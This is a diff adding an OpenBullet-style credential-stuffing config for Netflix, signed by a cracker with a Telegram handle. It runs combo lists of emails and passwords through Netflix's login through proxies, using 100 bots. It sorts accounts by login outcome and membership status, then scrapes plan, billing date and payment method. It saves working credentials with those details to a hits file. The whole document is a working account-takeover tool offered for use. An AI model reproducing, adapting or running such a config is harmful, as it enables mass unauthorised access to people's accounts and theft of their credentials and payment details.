@@ -1,0 +1,122 @@
+[SETTINGS]
+{
+  "Name": "Netflix v01",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-21T00:41:41.8933951+02:00",
+  "AdditionalInfo": "",
+  "Author": "@BORN_2_CRACK",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Auto Save Hits ^_^",
+      "VariableName": "",
+      "Id": 1939942549
+    },
+    {
+      "Description": "Contact me : t.me/Born2Crackk",
+      "VariableName": "",
+      "Id": 688534715
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOG REQUEST GET "https://www.netflix.com/tn-en/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#auth0 PARSE "<SOURCE>" LR "\"name\":null,\"guid\":null,\"userGuid\":null,\"countryOfSignup\":null,\"currentCountry\":null,\"membershipStatus\":\"ANONYMOUS\",\"isInFreeTrial\":null,\"authURL\":\"" "\"," -> VAR "auth0" 
+
+#auth1 FUNCTION URLEncode "<auth0>" -> VAR "auth1" 
+
+#auth FUNCTION Translate 
+  KEY "%5Cx3D" VALUE "%3D" 
+  "<auth1>" -> VAR "auth" 
+
+#lgn REQUEST POST "https://www.netflix.com/tn-en/Login" 
+  CONTENT "userLoginId=<USER>&password=<PASS>&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode%2CrecaptchaResponseToken%2CrecaptchaError%2CrecaptchaResponseTime&authURL=<auth>&nextPage=&showPassword=&countryCode=%2B216&countryIsoCode=TN&recaptchaResponseToken=&recaptchaResponseTime=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.netflix.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.netflix.com/tn-en/Login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY ".\",\"email_incorrect_password\":\"\\" 
+    KEY ".\",\"incorrect_password" 
+  KEYCHAIN Success OR 
+    KEY "class=\"addProfileIcon icon-tvuiAdd\"></div><span class=\"profile-name\">" 
+    KEY "\"membershipStatus\":\"CURRENT_MEMBER\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"membershipStatus\":\"FORMER_MEMBER\"" 
+    KEY "\"membershipStatus\":\"NEVER_MEMBER\"" 
+
+REQUEST GET "https://www.netflix.com/YourAccount" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Plan0 PARSE "<SOURCE>" LR "Premium\"},\"videoQuality\":{\"fieldType\":\"String\",\"value\":\"" "\"" -> VAR "Plan0" 
+
+#Plan FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "UHD" VALUE "Premium Ultra HD" 
+  KEY "FHD" VALUE "Standard HD" 
+  KEY "SD" VALUE "Basic SD" 
+  "<Plan0>" -> CAP "Plan" 
+
+#nextBillingDate PARSE "<SOURCE>" LR "=\"nextBillingDate-item\">" ".<" CreateEmpty=FALSE -> CAP "-" 
+
+#Payment_Method PARSE "<SOURCE>" LR "paymentMethod\":{\"fieldType\":\"String\",\"value\":\"" "\"}" CreateEmpty=FALSE -> CAP "Payment Method" 
+
+FUNCTION Constant "@BORN_2_CRACK" -> CAP "Telegram" 
+
+UTILITY File "Netflix.txt" AppendLines "[ Email : <USER> ] --- [ Password : <PASS> ] --- [ Plan : <Plan> ] --- [ - : <-> ] --- [ Payment Method : <Payment Method> ] --- [ Telegram : t.me/Born2Crackk ]" 
+
